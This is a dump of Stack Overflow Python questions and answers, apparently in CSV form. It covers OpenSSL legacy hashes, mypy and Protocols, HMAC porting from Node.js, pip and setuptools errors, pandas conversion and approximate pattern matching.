  File &quot;/usr/lib/python3.10/hashlib.py&quot;, line 123, in __get_builtin_constructor
    raise ValueError('unsupported hash type ' + name)
ValueError: unsupported hash type ripemd160
</code></pre>
<p>I already tried to check if that hash exists in the library, and if I have it:</p>
<p><code>print(hashlib.algorithms_available)</code>: {'md5', 'sm3', 'sha3_512', 'sha384', 'sha256', 'sha1', 'shake_128', 'sha224', 'sha512_224', 'sha512_256', 'blake2b', <strong>'ripemd160'</strong>, 'md5-sha1', 'sha512', 'sha3_256', 'shake_256', 'sha3_384', 'whirlpool', 'md4', 'blake2s', 'sha3_224'}</p>
<p>I am having this problem in a vps with linux, but in my pc I use Windows and I don't have this problem.</p>
<p>I sincerely appreciate any help or suggestion.</p>
","72508879","<p>Hashlib uses OpenSSL for ripemd160 and apparently OpenSSL disabled some older crypto algos around version 3.0 in November 2021. All the functions are still there but require manual enabling. See <a href=""https://github.com/openssl/openssl/issues/16994"" rel=""noreferrer"">issue 16994 of OpenSSL github project</a> for details.</p>
<p>To quickly enable it, find the directory that holds your OpenSSL config file or a symlink to it, by running the below command:</p>
<pre><code>openssl version -d
</code></pre>
<p>You can now go to the directory and edit the config file (it may be necessary to use sudo):</p>
<pre><code>nano openssl.cnf
</code></pre>
<p>Make sure that the config file contains following lines:</p>
<pre><code>openssl_conf = openssl_init

[openssl_init]
providers = provider_sect

[provider_sect]
default = default_sect
legacy = legacy_sect

[default_sect]
activate = 1

[legacy_sect]
activate = 1
</code></pre>
<p>Tested on: OpenSSL 3.0.2, Python 3.10.4, Linux Ubuntu 22.04 LTS aarch64, I have no access to other platforms at the moment.</p>
"
"72756419","1","MyPy: 'incompatible type' for virtual class inheritance","<h2>Demo code</h2>
<pre class=""lang-py prettyprint-override""><code>#!/usr/bin/env python3

from abc import ABCMeta, abstractmethod

class Base(metaclass = ABCMeta):
    @classmethod
    def __subclasshook__(cls, subclass):
        return (
            hasattr(subclass, 'x')
        )

    @property
    @abstractmethod
    def x(self) -&gt; float:
        raise NotImplementedError

class Concrete:
    x: float = 1.0

class Application:
    def __init__(self, obj: Base) -&gt; None:
        print(obj.x)

ob = Concrete() 
app = Application(ob)

print(issubclass(Concrete, Base))
print(isinstance(Concrete, Base))
print(type(ob))
print(Concrete.__mro__)
</code></pre>
<p><code>python test_typing.py</code> returns:</p>
<pre><code>1.0
True
False
&lt;class '__main__.Concrete'&gt;
(&lt;class '__main__.Concrete'&gt;, &lt;class 'object'&gt;)
</code></pre>
<p>and <code>mypy test_typing.py</code> returns:</p>
<pre><code>test_typing.py:30: error: Argument 1 to &quot;Application&quot; has incompatible type &quot;Concrete&quot;; expected &quot;Base&quot;
Found 1 error in 1 file (checked 1 source
</code></pre>
<p>But if i change the line <code>class Concrete:</code> to <code>class Concrete(Base):</code>, i get for
<code>python test_typing.py</code> this:</p>
<pre><code>1.0
True
False
&lt;class '__main__.Concrete'&gt;
(&lt;class '__main__.Concrete'&gt;, &lt;class '__main__.Base'&gt;, &lt;class 'object'&gt;)
</code></pre>
<p>and for <code>mypy test_typing.py</code> this:</p>
<pre><code>Success: no issues found in 1 source file
</code></pre>
<p>If i add to my code this:</p>
<pre><code>reveal_type(Concrete)
reveal_type(Base)
</code></pre>
<p>i get in both cases the same results for it from <code>mypy test_typing.py</code>:</p>
<pre><code>test_typing.py:37: note: Revealed type is &quot;def () -&gt; vmc.test_typing.Concrete&quot;
test_typing.py:38: note: Revealed type is &quot;def () -&gt; vmc.test_typing.Base&quot;
</code></pre>
<h2>Conclusion</h2>
<p>Seems obvious, that MyPi have some problems with virtual base classes but non-virtual inheritance seems working as expected.</p>
<h2>Question</h2>
<p>How works MyPy's type estimation in these cases?
Is there an workaround?</p>
<h2>2nd Demo code</h2>
<p>Using <code>Protocol</code> pattern:</p>
<pre class=""lang-py prettyprint-override""><code>#!/usr/bin/env python3

from abc import abstractmethod
from typing import Protocol, runtime_checkable

@runtime_checkable
class Base(Protocol):
    @property
    def x(self) -&gt; float:
        raise NotImplementedError
    
    @abstractmethod
    def __init__(self, x: float) -&gt; None:
        raise NotImplementedError

    &quot;&quot;&quot;
    @classmethod
    def test(self) -&gt; None:
        pass
    &quot;&quot;&quot;

class Concrete:
    x: float = 1.0

class Application:
    def __init__(self, obj: Base) -&gt; None:
        pass

ob = Concrete() 
app = Application(ob)
</code></pre>
<h2>Pros</h2>
<ul>
<li>Working with <code>mypy</code>: <code>Success: no issues found in 1 source file</code></li>
<li>Working with <code>isinstance(Concrete, Base)</code> : <code>True</code></li>
</ul>
<h2>Cons</h2>
<ul>
<li>Not working with <code>issubclass(Concrete, Base)</code>: <code>TypeError: Protocols with non-method members don't support issubclass()</code></li>
<li>Not checking the <code>__init__</code> method signatures: <code>__init__(self, x: float) -&gt; None</code> vs. <code>__init__(self) -&gt; None</code> (Why returns <code>inspect.signature()</code> the strings <code>(self, *args, **kwargs)</code> and <code>(self, /, *args, **kwargs)</code> here? With <code>class Base:</code> instead of <code>class Base(Protocol):</code> i get <code>(self, x: float) -&gt; None</code> and <code>(self, /, *args, **kwargs)</code>)</li>
<li>ignoring the difference between <code>@abstractmethod</code> and <code>@classmethod</code> (treats ANY method as abstract)</li>
</ul>
<h2>3rd Demo code</h2>
<p>This time just an more complex example of the 1st code:</p>
<pre class=""lang-py prettyprint-override""><code>#!/usr/bin/env python3

from abc import ABCMeta, abstractmethod
from inspect import signature

class Base(metaclass = ABCMeta):
    @classmethod
    def __subclasshook__(cls, subclass):
        return (
            hasattr(subclass, 'x') and
            (signature(subclass.__init__) == signature(cls.__init__))
        )

    @property
    @abstractmethod
    def x(self) -&gt; float:
        raise NotImplementedError
    
    @abstractmethod
    def __init__(self, x: float) -&gt; None:
        raise NotImplementedError

    @classmethod
    def test(self) -&gt; None:
        pass

class Concrete:
    x: float = 1.0

    def __init__(self, x: float) -&gt; None:
        pass

class Application:
    def __init__(self, obj: Base) -&gt; None:
        pass

ob = Concrete(1.0) 
app = Application(ob)
</code></pre>
<h2>Pros</h2>
<ul>
<li>Working with <code>issubclass(Concrete, Base)</code>: <code>True</code></li>
<li>Working with <code>isinstance(Concrete, Base)</code>: <code>False</code></li>
<li>Method signature check also for <code>__init__</code>.</li>
</ul>
<h2>Cons</h2>
<ul>
<li>Not working with MyPy:
<pre><code>test_typing.py:42: error: Argument 1 to &quot;Application&quot; has incompatible type &quot;Concrete&quot;; expected &quot;Base&quot;
Found 1 error in 1 file (checked 1 source file)
</code></pre>
</li>
</ul>
<h2>4th Demo code</h2>
<p>In some circumstances the following code might be an possible solution.</p>
<pre class=""lang-py prettyprint-override""><code>#!/usr/bin/env python3

from typing import Protocol, runtime_checkable
from dataclasses import dataclass

@runtime_checkable
class Rotation(Protocol):
    @property
    def x(self) -&gt; float:
        raise NotImplementedError
    
    @property
    def y(self) -&gt; float:
        raise NotImplementedError

    @property
    def z(self) -&gt; float:
        raise NotImplementedError

    @property
    def w(self) -&gt; float:
        raise NotImplementedError

@dataclass
class Quaternion:
    x: float = 0.0
    y: float = 0.0
    z: float = 0.0
    w: float = 1.0

    def conjugate(self) -&gt; 'Quaternion':
        return type(self)(
            x = -self.x,
            y = -self.y,
            z = -self.z,
            w = self.w
        )

class Application:
    def __init__(self, rot: Rotation) -&gt; None:
        print(rot)

q = Quaternion(0.7, 0.0, 0.7, 0.0)
app = Application(q.conjugate())
</code></pre>
<h2>Pros:</h2>
<ul>
<li>Auto-generated <code>__init__</code> method because of <code>@dataclass</code> usage. here: <code>(self, x: float = 0.0, y: float = 0.0, z: float = 0.0, w: float = 1.0) -&gt; None</code></li>
<li>Works with <code>isinstance()</code>: <code>True</code></li>
<li>Works with mypy: <code>Success: no issues found in 1 source file</code></li>
</ul>
<h2>Cons:</h2>
<ul>
<li>You need to hope, that the next developer uses <code>@dataclass</code> along with implementing your interface..</li>
<li>Not usable for <code>__init__</code> methods, that are not only taken class attributes.</li>
</ul>
<p><strong>Tipp:</strong> If an forced <code>__init__</code> method is not required and only want to take care of the attributes, then just omit <code>@dataclass</code>.</p>
<h2>5th Demo code</h2>
<p>Updated the 4th code to provide more safety, but without implicit <code>__init__</code> method:</p>
<pre class=""lang-py prettyprint-override""><code>#!/usr/bin/env python3

from abc import abstractmethod
from typing import Protocol, runtime_checkable

@runtime_checkable
class Rotation(Protocol):
    @property
    @abstractmethod
    def x(self) -&gt; float:
        raise NotImplementedError
    
    @property
    @abstractmethod
    def y(self) -&gt; float:
        raise NotImplementedError

    @property
    @abstractmethod
    def z(self) -&gt; float:
        raise NotImplementedError

    @property
    @abstractmethod
    def w(self) -&gt; float:
        raise NotImplementedError

class Quaternion:
    _x: float = 0.0
    _y: float = 0.0
    _z: float = 0.0
    _w: float = 1.0

    @property
    def x(self) -&gt; float:
        return self._x

    @property
    def y(self) -&gt; float:
        return self._y

    @property
    def z(self) -&gt; float:
        return self._z

    @property
    def w(self) -&gt; float:
        return self._w

    def __init__(self, x: float, y: float, z: float, w: float) -&gt; None:
        self._x = float(x)
        self._y = float(y)
        self._z = float(z)
        self._w = float(w)

    def conjugate(self) -&gt; 'Quaternion':
        return type(self)(
            x = -self.x,
            y = -self.y,
            z = -self.z,
            w = self.w
        )

    def __str__(self) -&gt; str:
        return &quot;, &quot;.join(
            (
                str(self._x),
                str(self._y),
                str(self._z),
                str(self._w)
            )
        )

    def __repr__(self) -&gt; str:
        cls = self.__class__
        module = cls.__module__
        return f&quot;{module + '.' if module != '__main__' else ''}{cls.__qualname__}({str(self)})&quot;

class Application:
    def __init__(self, rot: Rotation) -&gt; None:
        print(rot)

q = Quaternion(0.7, 0.0, 0.7, 0.0)
app = Application(q.conjugate())

</code></pre>
<h2>Current conclusion</h2>
<p>The <code>Protocol</code> way is unstable.
But the <code>Metaclass</code> way is not checkable, because it's not working with MyPy (because it's not static).</p>
<h2>Updated question</h2>
<p>Are there any alternative solutions to achieve some type of <strong>Interfaces</strong> (without <code>class Concrete(Base)</code>) AND make it type-safe (checkable)?</p>
","72843690","<h2>Result</h2>
<p>After running some tests and more research i am sure, that the actual problem is the behaviour of <code>Protocol</code> to silently overwrite the defined <code>__init__</code> method.</p>
<h2>Conclusion</h2>
<p>Seems logical, since Protocols are not intended to be initiated.
But sometimes it's required to define an <code>__init__</code> method,
because in my opinion <code>__init__</code> methods are also part of the interface of classes and it's objects.</p>
<h2>Solution</h2>
<p>I found an existing issue about this problem, that seems to confirm my point of view: <a href=""https://github.com/python/cpython/issues/88970"" rel=""nofollow noreferrer"">https://github.com/python/cpython/issues/88970</a></p>
<p>Fortunately it's already fixed:
<a href=""https://github.com/python/cpython/commit/5f2abae61ec69264b835dcabe2cdabe57b9a990e"" rel=""nofollow noreferrer"">https://github.com/python/cpython/commit/5f2abae61ec69264b835dcabe2cdabe57b9a990e</a></p>
<p>But unfortunately, this fix will only be part of Python 3.11 and above.</p>
<p>Currenty is Python 3.10.5 available.</p>
<p><strong>WARNING:</strong> Like mentioned in the issue, some static type checkers might behave different in this case. <strong>MyPy</strong> just ignores the missing <code>__init__</code> method (tested it, confirmed) BUT <strong>Pyright</strong> seems to detect and report the missing <code>__init__</code> method (not tested by me).</p>
"
"73765587","1","How to get a warning about a list being a mutable default argument?","<p>I accidentally used a <a href=""https://stackoverflow.com/questions/1132941/least-astonishment-and-the-mutable-default-argument"">mutable default argument</a> without knowing it.</p>
<p>Is there a linter or tool that can spot this and warn me?</p>
","73765790","<p><code>flake8-bugbear</code>, Pylint, PyCharm, and Pyright can detect this:</p>
<ul>
<li><p>Bugbear has <a href=""https://flake8.codes/B006/"" rel=""nofollow noreferrer""><code>B006</code></a> (Do not use mutable data structures for argument defaults).</p>
<blockquote>
<p>Do not use mutable data structures for argument defaults. They are created during function definition time. All calls to the function reuse this one instance of that data structure, persisting changes between them.</p>
</blockquote>
</li>
<li><p>Pylint has <a href=""https://pylint.pycqa.org/en/latest/user_guide/messages/warning/dangerous-default-value.html"" rel=""nofollow noreferrer""><code>W0102</code></a> (dangerous default value).</p>
<blockquote>
<p>Used when a mutable value as list or dictionary is detected in a default value for an argument.</p>
</blockquote>
</li>
<li><p>Pyright has <a href=""https://github.com/microsoft/pyright/blob/main/docs/configuration.md#:%7E:text=setting%20is%20%27warning%27.-,reportCallInDefaultInitializer,-%5Bboolean%20or%20string"" rel=""nofollow noreferrer""><code>reportCallInDefaultInitializer</code></a>.</p>
<blockquote>
<p>Generate or suppress diagnostics for function calls, list expressions, set expressions, or dictionary expressions within a default value initialization expression. Such calls can mask expensive operations that are performed at module initialization time.</p>
</blockquote>
<p>This does what you want, but be aware that it also checks for function calls in default arguments.</p>
</li>
<li><p>PyCharm has <a href=""https://stackoverflow.com/questions/41686829/why-does-pycharm-warn-about-mutable-default-arguments-how-can-i-work-around-the"">Default argument's value is mutable</a>.</p>
<blockquote>
<p>This inspection detects when a mutable value as list or dictionary is detected in a default value for an argument.</p>
<p>Default argument values are evaluated only once at function definition time, which means that modifying the default value of the argument will affect all subsequent calls of the function.</p>
</blockquote>
<p>Unfortunately, I can't find online documentation for this. If you have PyCharm, you can <a href=""https://www.jetbrains.com/help/pycharm/code-inspection.html#access-inspections-and-settings"" rel=""nofollow noreferrer"">access all inspections</a> and navigate to this inspection to find the documentation.</p>
</li>
</ul>
"
"73739158","1","NodeJS convert to Byte Array code return different results compare to python","<p>I got the following Javascript code and I need to convert it to Python(I'm not an expert in hashing so sorry for my knowledge on this subject)</p>
<pre><code>function generateAuthHeader(dataToSign) {
    let apiSecretHash = new Buffer(&quot;Rbju7azu87qCTvZRWbtGqg==&quot;, 'base64');
    let apiSecret = apiSecretHash.toString('ascii');
    var hash = CryptoJS.HmacSHA256(dataToSign, apiSecret);
    return hash.toString(CryptoJS.enc.Base64);
}
</code></pre>
<p>when I ran <code>generateAuthHeader(&quot;abc&quot;)</code> it returned <code>+jgBeooUuFbhMirhh1KmQLQ8bV4EXjRorK3bR/oW37Q=</code></p>
<p>So I tried writing the following Python code:</p>
<pre><code>def generate_auth_header(data_to_sign):
    api_secret_hash = bytearray(base64.b64decode(&quot;Rbju7azu87qCTvZRWbtGqg==&quot;))
    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()
    return base64.b64encode(hash).decode()
</code></pre>
<p>But when I ran <code>generate_auth_header(&quot;abc&quot;)</code> it returned a different result <code>aOGo1XCa5LgT1CIR8C1a10UARvw2sqyzWWemCJBJ1ww=</code></p>
<p>Can someone tell me what is wrong with my Python code and what I need to change?</p>
<p>The base64 is the string I generated myself for this post</p>
<p>UPDATE:
this is the document I'm working with</p>
<pre><code>//Converting the Rbju7azu87qCTvZRWbtGqg== (key) into byte array 
//Converting the data_to_sign into byte array 
//Generate the hmac signature
</code></pre>
<p>it seems like <code>apiSecretHash</code> and <code>api_secret_hash</code> is different, but I don't quite understand as the equivalent of <code>new Buffer()</code> in NodeJS is <code>bytearray()</code> in python</p>
","73769662","<p>It took me 2 days to look it up and ask for people in python discord and I finally got an answer. Let me summarize the problems:</p>
<ul>
<li>API secret hash from both return differents hash of the byte array
javascript</li>
</ul>
<p>Javascript</p>
<pre><code>apiSecret = &quot;E8nm,ns:\u0002NvQY;F*&quot;
</code></pre>
<p>Python</p>
<pre><code>api_secret_hash = b'E\xb8\xee\xed\xac\xee\xf3\xba\x82N\xf6QY\xbbF\xaa'
</code></pre>
<p>once we replaced the hash with python code it return the same result</p>
<pre><code>def generate_auth_header(data_to_sign):
    api_secret_hash = &quot;E8nm,ns:\u0002NvQY;F*&quot;.encode()

    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()
    return base64.b64encode(hash).decode()
</code></pre>
<p>encoding for ASCII in node.js you can find here <a href=""https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L636-L647"" rel=""noreferrer"">https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L636-L647</a></p>
<pre><code>case ASCII:
  if (contains_non_ascii(buf, buflen)) {
    char* out = node::UncheckedMalloc(buflen);
    if (out == nullptr) {
      *error = node::ERR_MEMORY_ALLOCATION_FAILED(isolate);
      return MaybeLocal&lt;Value&gt;();
    }
    force_ascii(buf, out, buflen);
    return ExternOneByteString::New(isolate, out, buflen, error);
  } else {
    return ExternOneByteString::NewFromCopy(isolate, buf, buflen, error);
  }
</code></pre>
<p>there is this force_ascii() function that is called when the data contains non-ASCII characters which is implemented here <a href=""https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L531-L573"" rel=""noreferrer"">https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L531-L573</a></p>
<p>so we need to check for the hash the same as NodeJS one, so we get the final version of the Python code:</p>
<pre><code>def generate_auth_header(data_to_sign):
    # convert to bytearray so the for loop below can modify the values
    api_secret_hash = bytearray(base64.b64decode(&quot;Rbju7azu87qCTvZRWbtGqg==&quot;))
    
    # &quot;force&quot; characters to be in ASCII range
    for i in range(len(api_secret_hash)):
        api_secret_hash[i] &amp;= 0x7f;

    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()
    return base64.b64encode(hash).decode()
</code></pre>
<p>now it returned the same result as NodeJS one</p>
<p>Thank you Mark from the python discord for helping me understand and fix this!</p>
<p>Hope anyone in the future trying to convert byte array from javascript to python know about this different of NodeJS Buffer() function</p>
"
"72511979","1","ValueError: install DBtypes to use this function","<p>I'm using BigQuery for the first time.</p>
<pre><code>client.list_rows(table, max_results = 5).to_dataframe();
</code></pre>
<p>Whenever I use to_dataframe() it raises this error:</p>
<blockquote>
<p>ValueError: Please install the 'db-dtypes' package to use this function.</p>
</blockquote>
<p>I found <a href=""https://github.com/feast-dev/feast/issues/2537"" rel=""nofollow noreferrer"">this</a> similar problem (almost exactly the same), but I can't understand how to implement their proposed solution.</p>
","72514645","<p>I was able to replicate your use case as shown below.
<a href=""https://i.stack.imgur.com/cR5IT.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/cR5IT.png"" alt=""enter image description here"" /></a></p>
<p>Easiest solution is to <code>pip install db-dtypes</code> as mentioned by @MattDMo.</p>
<p>Or you can specify previous version of <code>google-cloud-bigquery</code> by creating a <code>requirements.txt</code> with below contents:</p>
<pre><code>google-cloud-bigquery==2.34.3
</code></pre>
<p>And then pip install by using command as shown below:</p>
<pre><code>pip install -r /path/to/requirements.txt
</code></pre>
<p>Output of my sample replication:
<a href=""https://i.stack.imgur.com/60UqY.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/60UqY.png"" alt=""enter image description here"" /></a></p>
"
"72294299","1","Multiple top-level packages discovered in a flat-layout","<p>I am trying to install a library from the source that makes use of Poetry, but I get this error</p>
<pre><code>error: Multiple top-level packages discovered in a flat-layout: ['tulips', 'fixtures'].
        
To avoid accidental inclusion of unwanted files or directories,
setuptools will not proceed with this build.
        
If you are trying to create a single distribution with multiple packages
on purpose, you should not rely on automatic discovery.
Instead, consider the following options:
        
1. set up custom discovery (`find` directive with `include` or `exclude`)
2. use a `src-layout`
3. explicitly set `py_modules` or `packages` with a list of names
        
To find more information, look for &quot;package discovery&quot; on setuptools docs
</code></pre>
<p>What do I need to do to fix it?</p>
","72547402","<p>Based on <a href=""https://github.com/pypa/setuptools/issues/3197#issuecomment-1078770109"" rel=""noreferrer"">this comment on a GitHub issue</a>, adding the following lines to your <code>pyproject.toml</code> might solve your problem:</p>
<pre><code>[tool.setuptools]
py-modules = []
</code></pre>
<p>(For my case, the other workaround provided in that comment, i.e. adding <code>py_modules=[]</code> as a keyword argument to the setup() function in <code>setup.py</code>  worked)</p>
"
"72199354","1","Python type hinting for a generic mutable tuple / fixed length sequence with multiple types","<p>I am currently working on adding type hints to a project and can't figure out how to get this right. I have a list of lists, with the nested list containing two elements of type int and float. The first element of the nested list is always an int and the second is always a float.</p>
<pre><code>my_list = [[1000, 5.5], [1432, 2.2], [1234, 0.3]]
</code></pre>
<p>I would like to type annotate it so that unpacking the inner list in for loops or loop comprehensions keeps the type information. I could change the inner lists to tuples and would get what I'm looking for:</p>
<pre><code>def some_function(list_arg: list[tuple[int, float]]): pass

</code></pre>
<p>However, I need the inner lists to be mutable. Is there a nice way to do this for lists? I know that abstract classes like Sequence and Collection do not support multiple types.</p>
","73817809","<p>I think the question highlights a fundamental difference between statically typed Python and dynamically typed Python. For someone who is used to dynamically typed Python (or Perl or JavaScript or any number of other scripting languages), it's perfectly normal to have diverse data types in a list. It's convenient, flexible, and doesn't require you to define custom data types. However, when you introduce static typing, you step into a tighter box that requires more rigorous design.</p>
<p>As several others have already pointed out, type annotations for lists require all elements of the list to be the same type, and don't allow you to specify a length. Rather than viewing this as a shortcoming of the type system, you should consider that the flaw is in your own design. What you are really looking for is a class with two data members. The first data member is named <code>0</code>, and has type <code>int</code>, and the second is named <code>1</code>, and has type <code>float</code>. As your friend, I would recommend that you define a proper class, with meaningful names for these data members. As I'm not sure what your data type represents, I'll make up names, for illustration.</p>
<pre><code>class Sample:
    def __init__(self, atomCount: int, atomicMass: float):
        self.atomCount = atomCount
        self.atomicMass = atomicMass
</code></pre>
<p>This not only solves the typing problem, but also gives a major boost to readability. Your code would now look more like this:</p>
<pre><code>my_list = [Sample(1000, 5.5), Sample(1432, 2.2), Sample(1234, 0.3)]

def some_function(list_arg: list[Sample]): pass
</code></pre>
<p>I do think it's worth highlighting Stef's comment, which points to <a href=""https://stackoverflow.com/q/29290359/6284025"">this</a> question. The answers given highlight two useful features related to this.</p>
<p>First, as of Python 3.7, you can mark a class as a data class, which will automatically generate methods like <code>__init__()</code>. The <code>Sample</code> class would look like this, using the <code>@dataclass</code> decorator:</p>
<pre><code>from dataclasses import dataclass

@dataclass
class Sample:
    atomCount: int
    atomicMass: float
</code></pre>
<p>Another answer to that question mentions a PyPi package called recordclass, which it says is basically a mutable <code>namedtuple</code>. The typed version is called <code>RecordClass</code></p>
<pre><code>from recordclass import RecordClass

class Sample(RecordClass):
    atomCount: int
    atomicMass: float
</code></pre>
"
"73302071","1","NoneType error when trying to use pdb via FormmatedTB","<p>When executing the following code:</p>
<pre><code>from IPython.core import ultratb
sys.excepthook = ultratb.FormattedTB(mode='Verbose', color_scheme='Linux', call_pdb=1)
</code></pre>
<p>In order to catch exceptions, I receive the following error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py&quot;, line 994, in __init__
    VerboseTB.__init__(self, color_scheme=color_scheme, call_pdb=call_pdb,
  File &quot;/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py&quot;, line 638, in __init__
    TBTools.__init__(
  File &quot;/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py&quot;, line 242, in __init__
    self.pdb = debugger_cls()
TypeError: 'NoneType' object is not callable
</code></pre>
<p>Using python 3.8.2 and IPython 8.4.0</p>
<p>pdb otherwise is working fine.</p>
<p>Any idea for a fix for this?</p>
","73304196","<p>Downgrading IPython to 7.34.0 solved this.</p>
"
"72554445","1","Pandas: convert a series which contains strings like ""10%"" and ""0.10"" into numeric","<p>What is the best way to convert a Pandas series that contains strings of the type &quot;10%&quot; and &quot;0.10&quot; into numeric values?</p>
<p>I know that if I have a series with just &quot;0.10&quot; type strings I can just do <code>pd.to_numeric</code>.</p>
<p>I also know that if I have a series of &quot;10%&quot; type strings I can do <code>str.replace(&quot;%&quot;,&quot;&quot;)</code> and then do <code>pd.to_numeric</code> and divide by 100.</p>
<p>The issue I have is for a series with a mix of &quot;0.10&quot; and &quot;10%&quot; type strings. How do I best convert this into a series with the correct numeric types.</p>
<p>I think I could do it by first making a temporary series with True / False depending on if the string has &quot;%&quot; in it or not and then based on that applying a function. But this seems inefficient.</p>
<p>Is there a better way?</p>
<p>What I Have Tried for Reference:</p>
<pre class=""lang-py prettyprint-override""><code>mixed = pd.Series([&quot;10%&quot;,&quot;0.10&quot;,&quot;5.5%&quot;,&quot;0.02563&quot;])
mixed.str.replace(&quot;%&quot;,&quot;&quot;).astype(&quot;float&quot;)/100

0    0.100000
1    0.001000
2    0.055000
3    0.000256
dtype: float64
# This doesn't work, because even the 0.10 and 0.02563 are divided by 100.
</code></pre>
","72554525","<p>The easiest solution is to select entries using a mask and handle them in bulk:</p>
<pre class=""lang-py prettyprint-override""><code>from pandas import Series, to_numeric

mixed = Series([&quot;10%&quot;, &quot;0.10&quot;, &quot;5.5%&quot;, &quot;0.02563&quot;])

# make an empty series with similar shape and dtype float
converted = Series(index=mixed.index, dtype='float')

# use a mask to select specific entries
mask = mixed.str.contains(&quot;%&quot;)

converted.loc[mask] = to_numeric(mixed.loc[mask].str.replace(&quot;%&quot;, &quot;&quot;)) / 100
converted.loc[~mask] = to_numeric(mixed.loc[~mask])

print(converted)
# 0    0.10000
# 1    0.10000
# 2    0.05500
# 3    0.02563
# dtype: float64
</code></pre>
"
"73302356","1","How to make pip fail early when one of the requested requirements does not exist?","<p>Minimal example:</p>
<pre class=""lang-bash prettyprint-override""><code>pip install tensorflow==2.9.1 non-existing==1.2.3
</code></pre>
<pre><code>Defaulting to user installation because normal site-packages is not writeable
Looking in indexes: https://pypi.org/simple, https://pypi.ngc.nvidia.com
Collecting tensorflow==2.9.1
  Downloading tensorflow-2.9.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (511.7 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 511.7/511.7 MB 7.6 MB/s eta 0:00:00
ERROR: Could not find a version that satisfies the requirement non-existing==1.2.3 (from versions: none)
ERROR: No matching distribution found for non-existing==1.2.3

</code></pre>
<p>So <code>pip</code> downloads the (rather huge) TensorFlow first, only to <em>then</em> tell me that <code>non-existing</code> does not exist.</p>
<p>Is there a way to make it fail earlier, i.e., print the error and quit <em>before</em> downloading?</p>
","73304263","<p>I'm afraid there's no straightforward way of handling it. I ended up writing a simple bash script where I check the availability of packages using pip's index command:</p>
<pre><code>check_packages_availability () {
  while IFS= read -r line || [ -n &quot;$line&quot; ]; do
      package_name=&quot;${line%%=*}&quot;
      package_version=&quot;${line#*==}&quot;

      if ! pip index versions $package_name | grep &quot;$package_version&quot;; then
        echo &quot;package $line not found&quot;
        exit -1
      fi
  done &lt; requirements.txt
}

if ! check_packages_availability; then
  pip install -r requirements.txt
fi
</code></pre>
<p>This is a hacky solution but may work. For every package in <code>requirements.txt</code> this script tries to retrieve information about it and match the specified version. If everything's alright it starts installing them.</p>
<hr />
<p>Or you can use <a href=""https://python-poetry.org/docs/"" rel=""nofollow noreferrer""><code>poetry</code></a>, it handles resolving dependencies for you, for example:</p>
<p><em>pyproject.toml</em></p>
<pre><code>[tool.poetry]
name = &quot;test_missing_packages&quot;
version = &quot;0.1.0&quot;
description = &quot;&quot;
authors = [&quot;funnydman&quot;]

[tool.poetry.dependencies]
python = &quot;^3.10&quot;
tensorflow = &quot;2.9.1&quot;
non-existing = &quot;1.2.3&quot;

[build-system]
requires = [&quot;poetry-core&gt;=1.0.0&quot;]
build-backend = &quot;poetry.core.masonry.api&quot;
</code></pre>
<p>At the resolving stage it throws exception without installing/downloading packages:</p>
<pre><code>Updating dependencies
Resolving dependencies... (0.2s)

SolverProblemError
    
Because test-missing-packages depends on non-existing (1.2.3) which doesn't match any versions, version solving failed.
</code></pre>
"
"72596436","1","How to perform approximate structural pattern matching for floats and complex","<p>I've read about and understand <a href=""https://docs.python.org/3/tutorial/floatingpoint.html"" rel=""noreferrer"">floating point round-off issues</a> such as:</p>
<pre><code>&gt;&gt;&gt; sum([0.1] * 10) == 1.0
False

&gt;&gt;&gt; 1.1 + 2.2 == 3.3
False

&gt;&gt;&gt; sin(radians(45)) == sqrt(2) / 2
False
</code></pre>
<p>I also know how to work around these issues with <a href=""https://docs.python.org/3/library/math.html#math.isclose"" rel=""noreferrer"">math.isclose()</a> and <a href=""https://docs.python.org/3/library/cmath.html#cmath.isclose"" rel=""noreferrer"">cmath.isclose()</a>.</p>
<p>The question is how to apply those work arounds to Python's match/case statement.  I would like this to work:</p>
<pre><code>match 1.1 + 2.2:
    case 3.3:
        print('hit!')  # currently, this doesn't match
</code></pre>
","72596437","<p>The key to the solution is to build a wrapper that overrides the <code>__eq__</code> method and replaces it with an approximate match:</p>
<pre><code>import cmath

class Approximately(complex):

    def __new__(cls, x, /, **kwargs):
        result = complex.__new__(cls, x)
        result.kwargs = kwargs
        return result

    def __eq__(self, other):
        try:
            return isclose(self, other, **self.kwargs)
        except TypeError:
            return NotImplemented
</code></pre>
<p>It creates approximate equality tests for both float values and complex values:</p>
<pre><code>&gt;&gt;&gt; Approximately(1.1 + 2.2) == 3.3
True
&gt;&gt;&gt; Approximately(1.1 + 2.2, abs_tol=0.2) == 3.4
True
&gt;&gt;&gt; Approximately(1.1j + 2.2j) == 0.0 + 3.3j
True
</code></pre>
<p>Here is how to use it in a match/case statement:</p>
<pre><code>for x in [sum([0.1] * 10), 1.1 + 2.2, sin(radians(45))]:
    match Approximately(x):
        case 1.0:
            print(x, 'sums to about 1.0')
        case 3.3:
            print(x, 'sums to about 3.3')
        case 0.7071067811865475:
            print(x, 'is close to sqrt(2) / 2')
        case _:
            print('Mismatch')
</code></pre>
<p>This outputs:</p>
<pre><code>0.9999999999999999 sums to about 1.0
3.3000000000000003 sums to about 3.3
0.7071067811865475 is close to sqrt(2) / 2
</code></pre>
"
